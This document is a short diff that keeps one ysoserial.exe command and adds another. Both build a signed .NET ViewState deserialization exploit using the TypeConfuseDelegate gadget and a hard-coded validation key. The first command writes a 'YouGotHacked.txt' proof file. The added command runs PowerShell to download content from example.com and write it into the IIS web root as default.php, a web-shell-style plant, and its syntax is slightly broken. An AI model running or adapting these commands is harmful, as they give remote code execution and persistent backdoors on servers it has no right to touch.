@@ -1,1 +1,5 @@
 ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo RCE Found > c:/Users/YouGotHacked.txt" --generator="AF879508" --validationkey="FAA45BC66E06323C48961DA2AEAF077D8786291E2748330F03B6601F08523B79" --validationalg="HMACSHA256" --islegacy --minify
+
+
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "
+powershell -NoProfile -Command Invoke-WebRequest https://example.com/page).Content | Out-File -FilePath C:\inetpub\wwwroot\default.php -Encoding utf8" --generator="AF879508" --validationkey="FAA45BC66E06323C48961DA2AEAF077D8786291E2748330F03B6601F08523B79" --validationalg="HMACSHA256" --islegacy --minify
